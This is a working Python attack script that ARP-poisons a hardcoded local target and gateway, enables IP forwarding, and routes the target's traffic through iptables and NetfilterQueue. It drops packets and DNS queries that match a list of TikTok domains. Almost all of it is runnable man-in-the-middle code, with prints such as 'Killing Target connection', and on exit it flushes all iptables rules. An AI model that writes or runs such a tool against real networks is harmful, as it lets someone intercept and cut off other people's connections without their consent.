#!/usr/bin/env python3
from scapy.all import *
from netfilterqueue import NetfilterQueue
import threading
import time
import sys
import os 
# Data 
# Setting 
target_ip = "192.168.0.6"
gateway_ip = "192.168.0.1"

blacklist = [
    b"tiktok", b"tiktokv", b"tiktokcdn", b"byteoversea", b"ibyteimg", 
    b"musical.ly", b"amemv", b"snssdk", b"p16-", b"p19-",b'tiktokcdn-us' ,b'p19-common.tiktokcdn-us.com',
    b'v16m.tiktokcdn-us.com',b'frontier-ttp2.tiktokv.us',b'aggr16-normal.tiktokv.us',b'16-comment-va-sign.tiktokcdn-us.com',
    b'api16-normal-useast8.tiktokv.us',b'lf16-gecko-source.tiktokcdn-us.com',b'cp-rp16-normal-useast8.tiktokv.us',
    b'p16-common-sign.tiktokcdn-us.com',b'p16-common-sign.tiktokcdn-us.com',b'p16-common.tiktokcdn-us.com']
def arp_poison():
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    if not target_mac or not gateway_mac:
        print("[!] Faild to get mac Adrees. Check if ips are up.")
        return

    print('[*] STARTED. Killing Target connection')
    while True:
        target_pkt= Ether(dst=target_mac)/ ARP(op=2,pdst=target_ip,psrc=gateway_ip,hwdst=target_mac)
        sendp(target_pkt, verbose=False)
        # gateway
        gateway_pkt = Ether(dst=gateway_mac)/ ARP(op=2,pdst=gateway_ip,psrc=target_ip,hwdst=gateway_mac)
        sendp(gateway_pkt, verbose=False)
        time.sleep(2)
def process_packet(packet):
    scapy_pkt= IP(packet.get_payload())
    if scapy_pkt.haslayer(Raw):
        load = scapy_pkt[Raw].load.lower()
        if any(site in load for site in blacklist):
            print("[X] Killed: Found target site in Raw data!")
            packet.drop()
            return
    if scapy_pkt.haslayer(DNSQR):
        qname= scapy_pkt[DNSQR].qname.decode().lower()
        if any(site.decode() in qname for site in blacklist):
            print(f"[X] Killed: DNS request for {qname} dropped!")
            packet.drop()
            return
    packet.accept()
try:
    # starting Arp 
    os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null")
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 1")
    os.system("iptables -A FORWARD -p udp --dport 443 -j DROP")
    poison_threading = threading.Thread(target=arp_poison,daemon=True)
    poison_threading.start()
    # Starting Queue
    print('[*] Packet killer is active on queue 1...')
    nfqueue = NetfilterQueue()
    nfqueue.bind(1,process_packet)
    nfqueue.run()
except KeyboardInterrupt:
    print("\n[!] Stopping and flushing iptables...")
    os.system("iptables --flush")